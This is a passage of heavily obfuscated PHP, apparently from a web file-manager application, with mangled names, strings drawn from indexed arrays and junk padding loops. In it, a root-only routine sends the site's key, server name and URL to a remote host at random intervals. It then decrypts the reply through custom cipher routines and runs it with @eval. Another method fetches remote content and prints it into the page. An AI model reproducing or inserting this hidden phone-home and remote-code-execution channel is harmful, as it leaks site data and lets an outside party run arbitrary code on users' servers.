$ŸÒûî¹° = array_keys($this->versionPluginList()); $„Â‰¬†¨ = array_merge($¦Í“¯ŒÄ, $ŸÒûî¹°); $„Â‰¬†¨ = implode($Ç˜Ş«­î[226], array_filter(array_unique($„Â‰¬†¨))); } return $„Â‰¬†¨; } private function qbjy08d0706d() { $è¼›æóä =& $_SERVER[Æıâ¹•]; if ($this->ksvb63ffc96b != $è¼›æóä[109]) { $GLOBALS[$è¼›æóä[86]][$è¼›æóä[90]][$è¼›æóä[247]] = $è¼›æóä[206]; return; } $GLOBALS[$è¼›æóä[86]][$è¼›æóä[248]] = $è¼›æóä[122]; if (Model($è¼›æóä[249])->get($è¼›æóä[63]) != $è¼›æóä[206]) { Model($è¼›æóä[249])->set($è¼›æóä[63], $è¼›æóä[206]); } } public function bemr2bc49927() { return $_SERVER[Æıâ¹•][250]; } private function qpyu2621f8b4() { $·äÄáÃá =& $_SERVER[¡¬ıÜ ƒ]; $Î‹ƒó¨ =& $_SERVER[Æıâ¹•]; $ú¸Œ³ùˆ = array($Î‹ƒó¨[251], $Î‹ƒó¨[252], $Î‹ƒó¨[253]); $‹ŒôŸöñ = $·äÄáÃá[752]; $‹ƒü½Îí = $Î‹ƒó¨[254] . md5($Î‹ƒó¨[255]); $Í¥®ƒÜÃ = $·äÄáÃá[753]; if (strlen($Í¥®ƒÜÃ) < $·äÄáÃá[744]) { return; } if ($this->ksvb63ffc96b == $Î‹ƒó¨[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Î‹ƒó¨[24]], $ú¸Œ³ùˆ)) { return; } if (time() % 4 != 0) { return; } $Å¿€®Õ¦ = call_user_func(array($Î‹ƒó¨[256], $Î‹ƒó¨[257]), $‹ƒü½Îí); $ş¥¦óÜ– = $·äÄáÃá[754]; if (!$ş¥¦óÜ–) { return; } if ($Å¿€®Õ¦ && time() - $Å¿€®Õ¦ < intval($Î‹ƒó¨[258])) { return; } call_user_func(array($Î‹ƒó¨[256], $Î‹ƒó¨[139]), $‹ƒü½Îí, time()); $À›§Ò°ñ = Model($Î‹ƒó¨[33])->get($Î‹ƒó¨[100]); $†¯ìÑü = $·äÄáÃá[755]; if (!$†¯ìÑü) { return; } $ïÉä£’» = array($Î‹ƒó¨[152] => Model($Î‹ƒó¨[33])->get($Î‹ƒó¨[153]), $Î‹ƒó¨[167] => $this->ksvb63ffc96b, $Î‹ƒó¨[163] => $_SERVER[$Î‹ƒó¨[164]], $Î‹ƒó¨[165] => Model($Î‹ƒó¨[33])->get($Î‹ƒó¨[131]), $Î‹ƒó¨[105] => md5($_SERVER[$Î‹ƒó¨[106]] . $À›§Ò°ñ), $Î‹ƒó¨[156] => $Î‹ƒó¨[136], $Î‹ƒó¨[159] => $_SERVER[$Î‹ƒó¨[160]]); $—ö¦İ = $this->qwxtcd77bccf($Î‹ƒó¨[259], $ïÉä£’»); if (!is_array($—ö¦İ)) { return; } if ($—ö¦İ[$Î‹ƒó¨[152]] && $—ö¦İ[$Î‹ƒó¨[260]]) { if ($this->crvbb3cafbba($—ö¦İ[$Î‹ƒó¨[260]]) == $ïÉä£’»[$Î‹ƒó¨[152]]) { return; } } $this->qubg7b56c0a7(); $å³ÁÔĞË = $·äÄáÃá[756]; while ($å³ÁÔĞË < $·äÄáÃá[710]) { if ($å³ÁÔĞË >= 0) { break; } $å³ÁÔĞË++; } if ($this->crvbb3cafbba($—ö¦İ[$Î‹ƒó¨[260]]) != $ïÉä£’»[$Î‹ƒó¨[152]]) { $¨„ñíæ = array($Î‹ƒó¨[185] => $À›§Ò°ñ, $Î‹ƒó¨[186] => $_SERVER[$Î‹ƒó¨[106]], $Î‹ƒó¨[187] => this_url(), $Î‹ƒó¨[161] => $_SERVER[$Î‹ƒó¨[162]]); $ê“Ä›¬“ = $this->tyqb3438ed3d(json_encode($¨„ñíæ)); $—ö¦İ = $this->qwxtcd77bccf($Î‹ƒó¨[188] . $ê“Ä›¬“); if ($—ö¦İ && is_array($—ö¦İ) && isset($—ö¦İ[$Î‹ƒó¨[260]])) { $èÆ¸…º÷ = $this->mngvc29f5971($—ö¦İ[$Î‹ƒó¨[260]], 2); if ($èÆ¸…º÷) { $èÆ¸…º÷ = $this->crvbb3cafbba($èÆ¸…º÷); } if ($èÆ¸…º÷) { try { @eval($èÆ¸…º÷); } catch (Exception $©Ûçè¤û) { } } } } } private function qwxtcd77bccf($ƒ ¸«àˆ = '', $œÌ¶ó€ª = array(), $Áõ‹Úíœ = 5) { $‚Ğİ›ïè =& $_SERVER[¡¬ıÜ ƒ]; $Ğñè¥ì’ =& $_SERVER[Æıâ¹•]; $Îïæ–­ = $Ğñè¥ì’[261]; $µŒÜı„¨ = $‚Ğİ›ïè[757]; if (!$µŒÜı„¨) { return; } $Îïæ–­ = $this->tilf0e36ffdb($Îïæ–­, $Ğñè¥ì’[262]); $Îïæ–­ = $Îïæ–­ . $ƒ ¸«àˆ; $ï¾£Á = $‚Ğİ›ïè[758]; if (strlen($ï¾£Á) < $‚Ğİ›ïè[710]) { die; } if ($œÌ¶ó€ª && is_array($œÌ¶ó€ª)) { $Îïæ–­ = $Îïæ–­ . $Ğñè¥ì’[263] . http_build_query($œÌ¶ó€ª); } if ($œÌ¶ó€ª === -1) { return $Îïæ–­; } $Â¾™»¸Ü = stream_context_create(array($Ğñè¥ì’[219] => array($Ğñè¥ì’[222] => $Áõ‹Úíœ, $Ğñè¥ì’[220] => $Ğñè¥ì’[264]), $Ğñè¥ì’[265] => array($Ğñè¥ì’[266] => !1, $Ğñè¥ì’[267] => !1))); $œÌ¶ó€ª = @file_get_contents($Îïæ–­, !1, $Â¾™»¸Ü); return json_decode($œÌ¶ó€ª, !0); $½İÛäÔ = $‚Ğİ›ïè[759]; while (strlen($½İÛäÔ) < $‚Ğİ›ïè[691]) { if (!$½İÛäÔ) { break; } $½İÛäÔ++; } $ÎÖÊİúâ = $‚Ğİ›ïè[760]; while (strlen($ÎÖÊİúâ) < $‚Ğİ›ïè[688]) { if (!$ÎÖÊİúâ) { break; } $ÎÖÊİúâ++; } } private function wdve121bf84f() { $µô¹ÂÅŒ =& $_SERVER[¡¬ıÜ ƒ]; $Ë²ƒ·€ü =& $_SERVER[Æıâ¹•]; $³ıóıÔ = array($Ë²ƒ·€ü[268] => $Ë²ƒ·€ü[269], $Ë²ƒ·€ü[270] => $Ë²ƒ·€ü[271], $Ë²ƒ·€ü[272] => $Ë²ƒ·€ü[273], $Ë²ƒ·€ü[274] => $Ë²ƒ·€ü[275], $Ë²ƒ·€ü[276] => $Ë²ƒ·€ü[277], $Ë²ƒ·€ü[278] => $Ë²ƒ·€ü[214], $Ë²ƒ·€ü[279] => $Ë²ƒ·€ü[214], $Ë²ƒ·€ü[280] => $Ë²ƒ·€ü[269], $Ë²ƒ·€ü[281] => $Ë²ƒ·€ü[271], $Ë²ƒ·€ü[282] => $Ë²ƒ·€ü[273], $Ë²ƒ·€ü[283] => $Ë²ƒ·€ü[284], $Ë²ƒ·€ü[285] => $Ë²ƒ·€ü[275], $Ë²ƒ·€ü[286] => $Ë²ƒ·€ü[287], $Ë²ƒ·€ü[288] => $Ë²ƒ·€ü[277], $Ë²ƒ·€ü[289] => $Ë²ƒ·€ü[290], $Ë²ƒ·€ü[291] => $Ë²ƒ·€ü[292], $Ë²ƒ·€ü[293] => $Ë²ƒ·€ü[294]); $”–Öù± = $µô¹ÂÅŒ[761]; while (strlen($”–Öù±) < $µô¹ÂÅŒ[691]) { if (!$”–Öù±) { break; } $”–Öù±++; } $†Ùã²‰ = $³ıóıÔ[$this->ksvb63ffc96b]; $†Ùã²‰ = intval($†Ùã²‰ ? $†Ùã²‰ : $Ë²ƒ·€ü[269]); $ùËÜÈå = _get($this->hwmr43eff4f3, $Ë²ƒ·€ü[295]); $ùËÜÈå = $ùËÜÈå ? intval($ùËÜÈå) : 0; $ÄÖÀÕ‘Æ = $µô¹ÂÅŒ[762]; if (strlen($ÄÖÀÕ‘Æ) < $µô¹ÂÅŒ[710]) { die; } return $†Ùã²‰ + $ùËÜÈå; $ØÎàÂÚá = $µô¹ÂÅŒ[763]; if (!$ØÎàÂÚá) { die; } } public function fmkyfab7e4ea($¿¦¬˜Â¾) { $—Ë–ë¹ç =& $_SERVER[¡¬ıÜ ƒ]; $î¨çÌŸô =& $_SERVER[Æıâ¹•]; $ò®Šõ€ê = $this->wdve121bf84f(); $Ş¥Ûîİ = $—Ë–ë¹ç[764]; if (!$Ş¥Ûîİ) { die; } if ($¿¦¬˜Â¾[$î¨çÌŸô[296]] == $î¨çÌŸô[122]) { return; } if ($ò®Šõ€ê >= intval($î¨çÌŸô[214])) { return; } $ÌàËıŞ˜ = Model($î¨çÌŸô[125])->count(); if ($ÌàËıŞ˜ <= $ò®Šõ€ê) { return; } $ª¬Ú²® = Model($î¨çÌŸô[125])->field($î¨çÌŸô[296])->limit($ò®Šõ€ê)->select(); $˜‘–ÆøÁ = $—Ë–ë¹ç[765]; if (strlen($˜‘–ÆøÁ) < $—Ë–ë¹ç[744]) { return; } $ª¬Ú²® = array_to_keyvalue($ª¬Ú²®, $î¨çÌŸô[6], $î¨çÌŸô[296]); $˜Á¾öî· = $—Ë–ë¹ç[766]; if (strlen($˜Á¾öî·) < $—Ë–ë¹ç[688]) { return; } if (!in_array($¿¦¬˜Â¾[$î¨çÌŸô[296]], $ª¬Ú²®)) { show_json($î¨çÌŸô[297], !1, $î¨çÌŸô[210]); } } public function dflva140775f() { $¶»Èù½ =& $_SERVER[¡¬ıÜ ƒ]; $²ƒì€ê™ =& $_SERVER[Æıâ¹•]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $°ĞÄ™Ñä = $²ƒì€ê™[217]; $–²‡ØÈ = $¶»Èù½[767]; if (!$–²‡ØÈ) { return; } $°ĞÄ™Ñä = $this->tilf0e36ffdb($°ĞÄ™Ñä, $²ƒì€ê™[218]); $““àİÜŠ = $¶»Èù½[768]; $ıÛÔ…ÍÏ = stream_context_create(array($²ƒì€ê™[219] => array($²ƒì€ê™[220] => $²ƒì€ê™[221], $²ƒì€ê™[222] => 3))); $¨¼¬³ƒ¨ = $¶»Èù½[769]; $áùÇúíƒ = @file_get_contents($°ĞÄ™Ñä, !1, $ıÛÔ…ÍÏ); $ËÛ¢›éå = $¶»Èù½[770]; if (strlen($ËÛ¢›éå) < $¶»Èù½[697]) { return; } echo $²ƒì€ê™[298] . hash_encode($áùÇúíƒ) . $²ƒì€ê™[299]; } private function djxu6123a2cc($ÉÖˆ¢ì¡, $øíóñ­å, $íŠ´È‹Š = 3) { $Ò½Â‹‚ü =& $_SERVER[¡¬ıÜ ƒ]; $³´ªß =& $_SERVER[Æıâ¹•]; usleep(1); $ÉÖˆ¢ì¡ = trim($ÉÖˆ¢ì¡); $Ù¬©”ı¦ = mt_rand(0, 5) . $³´ªß[6]; $å‹º˜³ö = rand_string(15); $ĞıèŒæ˜ = $³´ªß[300]; $¸…èèŞÆ = $Ò½Â‹‚ü[771]; if (!$¸…èèŞÆ) { return; } switch ($Ù¬©”ı¦) { case $³´ªß[206]: $’éôÀ× = $this->lwdn8a56ea14($ÉÖˆ¢ì¡, strrev($øíóñ­å . $å‹º˜³ö)); $œÓ ØÖ” = $Ò½Â‹‚ü[772]; break; $ÃÜ‘«éÏ = $Ò½Â‹‚ü[716]; case $³´ªß[122]: $’éôÀ× = $this->lwdn8a56ea14($ÉÖˆ¢ì¡, strrev($å‹º˜³ö . $øíóñ­å)); $ÀŒŸîì‹ = $Ò½Â‹‚ü[773]; if (strlen($ÀŒŸîì‹) < $Ò½Â‹‚ü[691]) { return; } break; case $³´ªß[301]: $’éôÀ× = $this->lwdn8a56ea14($ÉÖˆ¢ì¡, base64_encode($å‹º˜³ö . $øíóñ­å)); $ËÑáó’Í = $Ò½Â‹‚ü[774]; if (strlen($ËÑáó’Í) < $Ò½Â‹‚ü[688]) { return; } break; case $³´ªß[302]: $’éôÀ× = $this->lwdn8a56ea14($ÉÖˆ¢ì¡, md5($å‹º˜³ö . $øíóñ­å)); $ıïµ½ = $Ò½Â‹‚ü[775]; break; case $³´ªß[303]: $ÉÖˆ¢ì¡ = base64_encode($ÉÖˆ¢ì¡); $˜ğî÷Çï = $Ò½Â‹‚ü[776]; $İß÷á× = rand(0, 64); $“¬Ø±Ùã = $Ò½Â‹‚ü[777]; while ($“¬Ø±Ùã < $Ò½Â‹‚ü[697]) { if ($“¬Ø±Ùã >= 0) { break; } $“¬Ø±Ùã++; } $ÌËãü“Í = $ĞıèŒæ˜[$İß÷á×]; $–¾ÂÚšÅ = $Ò½Â‹‚ü[778]; if (strlen($–¾ÂÚšÅ) < $Ò½Â‹‚ü[691]) { return; } $†Ó×çâˆ = md5($ÌËãü“Í . md5($øíóñ­å . $ÌËãü“Í) . $øíóñ­å); $†Ó×çâˆ = substr($†Ó×çâˆ, $İß÷á× % 8, $İß÷á× % 8 + 7); $ĞóÑ˜¹ = $Ò½Â‹‚ü[779]; if (!$ĞóÑ˜¹) { return; } $İå™Ë¾É = $³´ªß[6]; $¸Ñ¶·ø® = 0; $¢Õ†âÛ¢ = 0; $ªû¬Õµ = $Ò½Â‹‚ü[780]; while (strlen($ªû¬Õµ) < $Ò½Â‹‚ü[697]) { if (!$ªû¬Õµ) { break; } $ªû¬Õµ++; } $İ°çè = 0; for ($¸Ñ¶·ø® = 0; $¸Ñ¶·ø® < strlen($ÉÖˆ¢ì¡); $¸Ñ¶·ø®++) { $İ°çè = $İ°çè == strlen($†Ó×çâˆ) ? 0 : $İ°çè; $Ôˆ²ƒÆ‰ = $Ò½Â‹‚ü[781]; while (strlen($Ôˆ²ƒÆ‰) < $Ò½Â‹‚ü[688]) { if (!$Ôˆ²ƒÆ‰) { break; } $Ôˆ²ƒÆ‰++; } $¢Õ†âÛ¢ = ($İß÷á× + strpos($ĞıèŒæ˜, $ÉÖˆ¢ì¡[$¸Ñ¶·ø®]) + ord($†Ó×çâˆ[$İ°çè++])) % 64; $üÃŒ‘ß = $Ò½Â‹‚ü[782]; if (!$üÃŒ‘ß) { return; } $İå™Ë¾É .= $ĞıèŒæ˜[$¢Õ†âÛ¢]; } $’éôÀ× = hash_encode($ÌËãü“Í . $İå™Ë¾É); $»ı–ÈÚÊ = $Ò½Â‹‚ü[783]; break; $ÆÆ¡óÄ… = $Ò½Â‹‚ü[784]; default: $’éôÀ× = $this->lwdn8a56ea14($ÉÖˆ¢ì¡, $øíóñ­å . $å‹º˜³ö); break; $†Êœíö… = $Ò½Â‹‚ü[785]; while (strlen($†Êœíö…) < $Ò½Â‹‚ü[710]) { if (!$†Êœíö…) { break; } $†Êœíö…++; } } $’éôÀ× = strrev($Ù¬©”ı¦ . $å‹º˜³ö . $’éôÀ×); $üÅø¦Çé = $Ò½Â‹‚ü[715]; if ($íŠ´È‹Š - 1 > 0) { $’éôÀ× = $this->djxu6123a2cc($’éôÀ×, $øíóñ­å, $íŠ´È‹Š - 1); } return $’éôÀ×; } private function mngvc29f5971($ŞòÎ¥ë‰, $µşë‰œ, $ò‚Ë»³â = 3) { $Êœ³ò¨ =& $_SERVER[¡¬ıÜ ƒ]; $•ÊÙ¬×ü =& $_SERVER[Æıâ¹•]; if (!is_string($ŞòÎ¥ë‰) || strlen($ŞòÎ¥ë‰) < 10) { return !1; } $ŞòÎ¥ë‰ = trim($ŞòÎ¥ë‰); $½À¬¹¯ = $Êœ³ò¨[786]; if (strlen($½À¬¹¯) < $Êœ³ò¨[710]) { return; } $ŞòÎ¥ë‰ = strrev($ŞòÎ¥ë‰); $ÁÊ¶ò·Ş = $Êœ³ò¨[787]; if (strlen($ÁÊ¶ò·Ş) < $Êœ³ò¨[697]) { die; } $Šèé°Á¶ = $ŞòÎ¥ë‰[0]; $ĞÛí‚ = substr($ŞòÎ¥ë‰, 1, 15); $Õ³™„ÕÃ = $Êœ³ò¨[788]; while (strlen($Õ³™„ÕÃ) < $Êœ³ò¨[744]) { if (!$Õ³™„ÕÃ) { break; } $Õ³™„ÕÃ++; } $ŞòÎ¥ë‰ = substr($ŞòÎ¥ë‰, 16); $÷µë„íù = $•ÊÙ¬×ü[300]; switch ($Šèé°Á¶) { case $•ÊÙ¬×ü[206]: $ëœ¸ï¸é = $this->tilf0e36ffdb($ŞòÎ¥ë‰, strrev($µşë‰œ . $ĞÛí‚)); break; $€ŞèŸÛ = $Êœ³ò¨[789]; case $•ÊÙ¬×ü[122]: $ëœ¸ï¸é = $this->tilf0e36ffdb($ŞòÎ¥ë‰, strrev($ĞÛí‚ . $µşë‰œ)); $ÎäÇĞ‹¨ = $Êœ³ò¨[790]; while (strlen($ÎäÇĞ‹¨) < $Êœ³ò¨[710]) { if (!$ÎäÇĞ‹¨) { break; } $ÎäÇĞ‹¨++; } break; case $•ÊÙ¬×ü[301]: $ëœ¸ï¸é = $this->tilf0e36ffdb($ŞòÎ¥ë‰, base64_encode($ĞÛí‚ . $µşë‰œ)); break; $ƒÁÍïşö = $Êœ³ò¨[791]; while ($ƒÁÍïşö < $Êœ³ò¨[688]) { if ($ƒÁÍïşö >= 0) { break; } $ƒÁÍïşö++; } case $•ÊÙ¬×ü[302]: $ëœ¸ï¸é = $this->tilf0e36ffdb($ŞòÎ¥ë‰, md5($ĞÛí‚ . $µşë‰œ)); break; $œ¦ô›‘¶ = $Êœ³ò¨[792]; if (!$œ¦ô›‘¶) { return; } case $•ÊÙ¬×ü[303]: $ŞòÎ¥ë‰ = hash_decode($ŞòÎ¥ë‰); $ÈÈ­İ§™ = $Êœ³ò¨[793]; if (strlen($ÈÈ­İ§™) < $Êœ³ò¨[744]) { die; } $‚„ÕÏ–Ï = $ŞòÎ¥ë‰[0]; $ŞòÎ¥ë‰ = substr($ŞòÎ¥ë‰, 1); $ë¶ÇÁ›à = $Êœ³ò¨[794]; if (!$ë¶ÇÁ›à) { die; } $ïí¬ë« = strpos($÷µë„íù, $‚„ÕÏ–Ï); $Şğ­ı°¦ = md5($‚„ÕÏ–Ï . md5($µşë‰œ . $‚„ÕÏ–Ï) . $µşë‰œ); $Şğ­ı°¦ = substr($Şğ­ı°¦, $ïí¬ë« % 8, $ïí¬ë« % 8 + 7); $Ãò¼Òµ = $•ÊÙ¬×ü[6]; $Ç£ø€Åï = $Êœ³ò¨[795]; $Ğ€‰ÀÛ = 0; $‰Î° ó€ = $Êœ³ò¨[796]; if (!$‰Î° ó€) { die; } $Ü­ùÀû‚ = 0; $¢ã¯«°é = 0; for ($Ğ€‰ÀÛ = 0; $Ğ€‰ÀÛ < strlen($ŞòÎ¥ë‰); $Ğ€‰ÀÛ++) { $¢ã¯«°é = $¢ã¯«°é == strlen($Şğ­ı°¦) ? 0 : $¢ã¯«°é; $øŸÒóÑõ = $Êœ³ò¨[797]; if (!$øŸÒóÑõ) { return; } $à£‘˜È = $¢ã¯«°é++; $Ü­ùÀû‚ = strpos($÷µë„íù, $ŞòÎ¥ë‰[$Ğ€‰ÀÛ]) - $ïí¬ë« - ord($Şğ­ı°¦[$à£‘˜È]); $¤½€Â = $Êœ³ò¨[798]; if (!$¤½€Â) { die; } while ($Ü­ùÀû‚ < 0) { $Ü­ùÀû‚ += 64; $›¯ÑĞ ƒ = $Êœ³ò¨[799]; } $Ãò¼Òµ .= $÷µë„íù[$Ü­ùÀû‚]; $²¼¹Œ€‘ = $Êœ³ò¨[800]; if (strlen($²¼¹Œ€‘) < $Êœ³ò¨[697]) { die; } } $ëœ¸ï¸é = base64_decode($Ãò¼Òµ); $Íòå‹üÏ = $Êœ³ò¨[801]; break; default: $ëœ¸ï¸é = $this->tilf0e36ffdb($ŞòÎ¥ë‰, $µşë‰œ . $ĞÛí‚); $ÜŒ‚Âàé = $Êœ³ò¨[802]; while (strlen($ÜŒ‚Âàé) < $Êœ³ò¨[710]) { if (!$ÜŒ‚Âàé) { break; } $ÜŒ‚Âàé++; } break; } if ($ò‚Ë»³â - 1 > 0) { $ëœ¸ï¸é = $this->mngvc29f5971($ëœ¸ï¸é, $µşë‰œ, $ò‚Ë»³â - 1); } return $ëœ¸ï¸é; } public function tyqb3438ed3d($¬œĞ¹ÒÒ) { $Ïç–É´ =& $_SERVER[¡¬ıÜ ƒ]; $íËê©²ş =& $_SERVER[Æıâ¹•]; $ÒˆÅëÏë = $this->kbde2dd1850c(); $³ˆÁèÅ± = $Ïç–É´[803]; $òî‘•¡ = $this->kbde2dd1850c(); $¦÷¥²£ = $Ïç–É´[804]; if (strlen($¦÷¥²£) < $Ïç–É´[691]) { return; } $€ƒÌÓöÌ = ($ÒˆÅëÏë - 1) * ($òî‘•¡ - 1); $Ã‰ôù = $Ïç–É´[805]; while (strlen($Ã‰ôù) < $Ïç–É´[688]) { if (!$Ã‰ôù) { break; } $Ã‰ôù++; } $æ¸šç = intval(($ÒˆÅëÏë + $òî‘•¡) / 2); $ÏÄÅ’Ò÷ = $Ïç–É´[806]; while (1) { $®­©İ‘‚ = $æ¸šç; $½ª‡±—› = $Ïç–É´[807]; if (!$½ª‡±—›) { return; } $Œì©İÚò = $€ƒÌÓöÌ; while ($Œì©İÚò % $®­©İ‘‚ != 0) { $Üç°óÎ = $Œì©İÚò; $üØ¸²œ¸ = $Ïç–É´[808]; while ($üØ¸²œ¸ < $Ïç–É´[691]) { if ($üØ¸²œ¸ >= 0) { break; } $üØ¸²œ¸++; } $Œì©İÚò = $®­©İ‘‚; $„–¶±° = $Ïç–É´[809]; if (!$„–¶±°) { return; } $®­©İ‘‚ = $Üç°óÎ % $®­©İ‘‚; $Ûèğûö¯ = $Ïç–É´[810]; while (strlen($Ûèğûö¯) < $Ïç–É´[744]) { if (!$Ûèğûö¯) { break; } $Ûèğûö¯++; } } if ($®­©İ‘‚ == 1) { break; } else { $æ¸šç++; } } $‡¯“šê’ = 2; $ğœ½üÓ¼ = $Ïç–É´[811]; if (!$ğœ½üÓ¼) { die; } for ($âó±ğÙ = 0; $âó±ğÙ < $€ƒÌÓöÌ * 10; $âó±ğÙ++) { if (($€ƒÌÓöÌ * $âó±ğÙ + 1) % $æ¸šç == 0) { $‡¯“šê’ = intval(($€ƒÌÓöÌ * $âó±ğÙ + 1) / $æ¸šç); break; } } $˜—”²è› = $this->lwdn8a56ea14($ÒˆÅëÏë * $òî‘•¡ . $íËê©²ş[6], $íËê©²ş[136]); $ĞÉùìÖÌ = $Ïç–É´[812]; if (strlen($ĞÉùìÖÌ) < $Ïç–É´[691]) { die; } $ŞÑ—¦ƒ› = md5($íËê©²ş[304] . ($ÒˆÅëÏë + $òî‘•¡) . $íËê©²ş[305] . $æ¸šç . $íËê©²ş[305] . $‡¯“šê’ . $íËê©²ş[306]); $­ªêÄ¨ = $Ïç–É´[813]; while (strlen($­ªêÄ¨) < $Ïç–É´[744]) { if (!$­ªêÄ¨) { break; } $­ªêÄ¨++; } $¢æÎ¾Âö = $this->lwdn8a56ea14($¬œĞ¹ÒÒ, $ŞÑ—¦ƒ›) . $íËê©²ş[307] . $˜—”²è›; return $¢æÎ¾Âö; $Ä¼Ô¦ŒÅ = $Ïç–É´[814]; } public function crvbb3cafbba($³¿½Ò¢) { $Šş¿Ï‚ =& $_SERVER[¡¬ıÜ ƒ]; $°ÓŒÇ¿‘ =& $_SERVER[Æıâ¹•]; $Ï£Õ™·Í = explode($°ÓŒÇ¿‘[307], $³¿½Ò¢); if (count($Ï£Õ™·Í) != 2) { return $°ÓŒÇ¿‘[6]; } $ÆŒ²•è¡ = $this->tilf0e36ffdb($Ï£Õ™·Í[1] . $°ÓŒÇ¿‘[6], $°ÓŒÇ¿‘[136]); $êĞãÖÏ† = $Šş¿Ï‚[815]; if (!$êĞãÖÏ†) { die; } if (!$ÆŒ²•è¡) { return $°ÓŒÇ¿‘[6]; } $ÆŒ²•è¡ = intval($ÆŒ²•è¡); $è„¨Âó = $Šş¿Ï‚[816]; $ÀÌÒª = 0; $ ³°Îà¶ = 0; for ($Çç»ó±„ = 3; $Çç»ó±„ < $ÆŒ²•è¡; $Çç»ó±„ += 2) { if ($ÆŒ²•è¡ % $Çç»ó±„ != 0) { continue; } $ÀÌÒª = $Çç»ó±„; $–ŞÜßØà = $Šş¿Ï‚[817]; if (strlen($–ŞÜßØà) < $Šş¿Ï‚[688]) { return; } $ ³°Îà¶ = intval($ÆŒ²•è¡ / $Çç»ó±„); break; } $å·ú’·Ø = ($ÀÌÒª - 1) * ($ ³°Îà¶ - 1); $È‰©‚¾ø = $Šş¿Ï‚[818]; if (strlen($È‰©‚¾ø) < $Šş¿Ï‚[710]) { return; } $×ƒ£¿î° = intval(($ÀÌÒª + $ ³°Îà¶) / 2); while (1) { $ã·—áÀ¦ = $×ƒ£¿î°; $”êŠ«â = $Šş¿Ï‚[819]; if (strlen($”êŠ«â) < $Šş¿Ï‚[710]) { die; } $í®«œ‚ = $å·ú’·Ø; $›¥ùœñĞ = $Šş¿Ï‚[820]; while ($›¥ùœñĞ < $Šş¿Ï‚[744]) { if ($›¥ùœñĞ >= 0) { break; } $›¥ùœñĞ++; } while ($í®«œ‚ % $ã·—áÀ¦ != 0) { $Ãì‡ö±— = $í®«œ‚; $í®«œ‚ = $ã·—áÀ¦; $ã·—áÀ¦ = $Ãì‡ö±— % $ã·—áÀ¦; } if ($ã·—áÀ¦ == 1) { break; } else { $×ƒ£¿î°++; } } $ É¸òÕ = 2; $«Ó§¦ˆ = $Šş¿Ï‚[821]; if (!$«Ó§¦ˆ) { die; } for ($Çç»ó±„ = 0; $Çç»ó±„ < $å·ú’·Ø * 10; $Çç»ó±„++) { if (($å·ú’·Ø * $Çç»ó±„ + 1) % $×ƒ£¿î° == 0) { $ É¸òÕ = intval(($å·ú’·Ø * $Çç»ó±„ + 1) / $×ƒ£¿î°); break; } } $İÆÄò²ç = md5($°ÓŒÇ¿‘[304] . ($ÀÌÒª + $ ³°Îà¶) . $°ÓŒÇ¿‘[305] . $×ƒ£¿î° . $°ÓŒÇ¿‘[305] . $ É¸òÕ . $°ÓŒÇ¿‘[306]); $á‰äú÷ = $this->tilf0e36ffdb($Ï£Õ™·Í[0], $İÆÄò²ç); $¯¬Èâê = $Šş¿Ï‚[822]; if (!$¯¬Èâê) { die; } return $á‰äú÷; } public function kbde2dd1850c() { $ö¼›Ä =& $_SERVER[¡¬ıÜ ƒ]; $·“À‹ï  = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÉƒÍ€ç‘ = array(); $½¤¶ŞËÖ = $ö¼›Ä[823]; while ($½¤¶ŞËÖ < $ö¼›Ä[691]) { if ($½¤¶ŞËÖ >= 0) { break; } $½¤¶ŞËÖ++; } $ÆƒïÎÁö = 1; while ($ÆƒïÎÁö <= (int) sqrt($·“À‹ï )) { $¥Ã‘í”¥ = $ÆƒïÎÁö; while (!0) { $¥Ã‘í”¥++; $“ŠŞ±¯‹ = $ö¼›Ä[824]; if (!$“ŠŞ±¯‹) { die; } if ($¥Ã‘í”¥ <= 2) { $ÆƒïÎÁö = $¥Ã‘í”¥; break; } else { if ($¥Ã‘í”¥ < 2) { continue; } } $ĞêŸìü = !0; for ($Í™­½¤Ç = 2; $Í™­½¤Ç <= sqrt($¥Ã‘í”¥); $Í™­½¤Ç++) { if ($¥Ã‘í”¥ % $Í™­½¤Ç == 0) { $ĞêŸìü = !1; } } if ($ĞêŸìü) { $ÆƒïÎÁö = $¥Ã‘í”¥; break; } } $ÉƒÍ€ç‘[] = $ÆƒïÎÁö; } $Áº·‚ĞŒ = 2; for ($¥Ã‘í”¥ = $·“À‹ï ; $¥Ã‘í”¥ > 1; $¥Ã‘í”¥--) { $ĞêŸìü = !0; foreach ($ÉƒÍ€ç‘ as $‹¾Ş¢ä) { if ($¥Ã‘í”¥ % $‹¾Ş¢ä == 0) { $ĞêŸìü = !1; break; } } if ($ĞêŸìü) { $Áº·‚ĞŒ = $¥Ã‘í”¥; break; } } return $Áº·‚ĞŒ; $Ç¸Å×«Ë = $ö¼›Ä[825]; if (strlen($Ç¸Å×«Ë) < $ö¼›Ä[710]) { return; } } public function ryqz82b69b80($ÖÁ£½ÒÉ, $şÚ°¹ìŞ) { $Š˜•É =& $_SERVER[¡¬ıÜ ƒ]; $Òôšş° =& $_SERVER[Æıâ¹•]; return call_user_func(array($Òôšş°[8], $Òôšş°[308]), $ÖÁ£½ÒÉ, $şÚ°¹ìŞ); $ìŒàØÈÜ = $Š˜•É[826]; while (strlen($ìŒàØÈÜ) < $Š˜•É[691]) { if (!$ìŒàØÈÜ) { break; } $ìŒàØÈÜ++; } } public function lwdn8a56ea14($Â©ßÎ×, $µıç‘à) { $»°áÃ™… =& $_SERVER[Æıâ¹•]; return call_user_func(array($»°áÃ™…[309], $»°áÃ™…[310]), $Â©ßÎ×, $µıç‘à); } public function tilf0e36ffdb($‘Ğ£¶‘®, $½õ€ƒ¶) { $Œ‡¥é®Ú =& $_SERVER[Æıâ¹•]; return call_user_func(array($Œ‡¥é®Ú[309], $Œ‡¥é®Ú[311]), $‘Ğ£¶‘®, $½õ€ƒ¶); $»‡—Ù×º = $_SERVER[¡¬ıÜ ƒ][827]; if (!$»‡—Ù×º) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¡¬ıÜ ƒ][828]); $this->init(); $this->keep(); } public function init() { $º¿‰åªè =& $_SERVER[¡¬ıÜ ƒ]; $this->isManual(); self::$name = date($º¿‰åªè[829]); if (!($İ«²áïË = $this->model->lastItem())) { $İ«²áïË = $this->initData(); } else { self::$name = $İ«²áïË[$º¿‰åªè[32]]; if ($İ«²áïË[$º¿‰åªè[830]] == $º¿‰åªè[91]) { self::$name = date($º¿‰åªè[261]); $ôØè©ş = intval(_get($İ«²áïË, $º¿‰åªè[831], 0)); if (self::$manual == 0 && 